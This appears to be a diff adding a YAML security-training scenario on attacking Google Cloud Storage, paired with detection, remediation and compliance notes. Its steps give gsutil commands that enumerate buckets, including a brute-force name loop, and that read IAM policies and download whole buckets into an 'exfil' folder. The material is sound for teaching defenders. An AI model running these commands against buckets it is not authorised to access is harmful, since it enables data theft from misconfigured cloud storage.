@@ -1,0 +1,106 @@
+# Category: Cloud Security - GCP
+name: "GCP Cloud Storage Enumeration and Exfiltration"
+id: "cloud-gcp-storage-001"
+category: "cloud_security"
+subcategory: "gcp"
+difficulty: "beginner"
+estimated_time: "45 minutes"
+
+description: |
+  Enumerate Google Cloud Storage (GCS) buckets to find publicly accessible
+  or misconfigured buckets, and exfiltrate sensitive data. Attackers can
+  list buckets, check bucket permissions, and download content if bucket
+  ACLs or IAM policies are too permissive.
+
+learning_objectives:
+  - Understand GCS bucket permissions (ACLs, IAM, uniform bucket-level access)
+  - Use gcloud and gsutil to list and scan buckets
+  - Identify publicly readable/writable buckets
+  - Exfiltrate bucket contents
+
+tools:
+  - gsutil
+  - gcloud
+  - bucket-stream (third-party scanner)
+  - curl (for public buckets)
+
+prerequisites:
+  - GCP project access (or just internet for public buckets)
+  - gsutil configured with credentials
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "List buckets in the project"
+    commands:
+      - "# List all buckets"
+      - "gsutil ls -p <PROJECT_ID>"
+      - "# Or enumerate publicly known buckets via brute force"
+      - "for name in $(cat bucket_names.txt); do gsutil ls gs://$name 2>/dev/null; done"
+    expected_output: "List of bucket names"
+    detection: "Cloud Storage API calls `storage.buckets.list` in Cloud Audit Logs"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Check bucket permissions and list contents"
+    commands:
+      - "# Get bucket IAM policy"
+      - "gsutil iam get gs://<BUCKET_NAME>"
+      - "# Test if bucket is publicly readable"
+      - "gsutil ls gs://<BUCKET_NAME> --all-versions"
+      - "# If ACLs are permissive, list objects"
+      - "gsutil ls -r gs://<BUCKET_NAME>"
+    expected_output: "List of objects inside the bucket, including subfolders"
+    detection: "Cloud Storage API calls `storage.objects.list` from unusual IPs"
+
+  - id: "step3"
+    phase: "exfiltration"
+    action: "Download sensitive data from bucket"
+    commands:
+      - "# Download entire bucket (or specific files)"
+      - "gsutil cp -r gs://<BUCKET_NAME> ./exfil/"
+      - "# Or use parallel download"
+      - "gsutil -m cp -r gs://<BUCKET_NAME> ./exfil/"
+    expected_output: "Local copy of bucket contents"
+    detection: "High egress traffic to external IPs; large `storage.objects.get` API calls"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1530"
+    description: "Data from Cloud Storage Object"
+  - standard: "CIS GCP Foundations"
+    control: "4.5"
+    description: "Ensure that Cloud Storage bucket is not publicly accessible"
+
+detection:
+  network_indicators:
+    - "Large volume of download traffic to external IPs"
+  log_indicators:
+    - "Cloud Audit Logs: `storage.objects.get` with high count"
+    - "Cloud Audit Logs: `storage.buckets.getIamPolicy` anomalies"
+  endpoint_indicators:
+    - "gsutil or curl processes with bucket names"
+
+remediation:
+  immediate:
+    - "Revoke public access (set uniform bucket-level access, remove `allUsers`/`allAuthenticatedUsers`)"
+    - "Rotate any exposed credentials found in bucket"
+  long_term:
+    - "Enable VPC Service Controls to restrict access"
+    - "Implement object‑level encryption (CMEK)"
+    - "Regularly scan for public buckets using tools like Scuba"
+
+variables:
+  project_id: "my-gcp-project"
+  bucket_name: "sensitive-data-bucket"
+
+assessment_questions:
+  - "What are the two main permission models for GCS buckets?"
+  - "How can you test if a bucket is publicly readable without credentials?"
+  - "What GCP service can automatically detect public buckets?"
+
+references:
+  - url: "https://cloud.google.com/storage/docs/access-control"
+    title: "GCS Access Control"
+  - url: "https://attack.mitre.org/techniques/T1530/"
+    title: "MITRE ATT&CK - Data from Cloud Storage"
